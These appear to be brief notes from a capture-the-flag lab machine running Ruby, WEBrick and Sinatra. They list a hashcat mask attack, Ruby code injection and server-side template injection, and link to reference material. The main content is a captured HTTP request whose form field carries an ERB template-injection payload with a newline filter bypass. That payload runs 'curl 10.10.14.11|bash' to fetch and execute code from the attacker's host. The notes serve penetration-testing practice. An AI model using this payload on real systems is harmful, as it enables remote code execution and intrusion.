## What I've used in this machine

- Mash attack with hashcat
- Code injection in Ruby
- Use of `strings` to find strings in a database
- Server-Side Template Injection (SSTI)

## Versions

Ruby 3.0.2
WEBrick/1.7.0
Sinatra

## Info

Request in burp suite:

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
Content-Length: 225
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.253
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.253/weighted-grade
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

category1=Test%0a%0d%0a%0d;'<%25=+`curl+10.10.14.11|bash`+%25>&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

## Links

- https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://nmap.org/nsedoc/scripts/ssh-brute.html
- https://www.stackhawk.com/blog/command-injection-ruby/
- https://hashcat.net/wiki/doku.php?id=mask_attack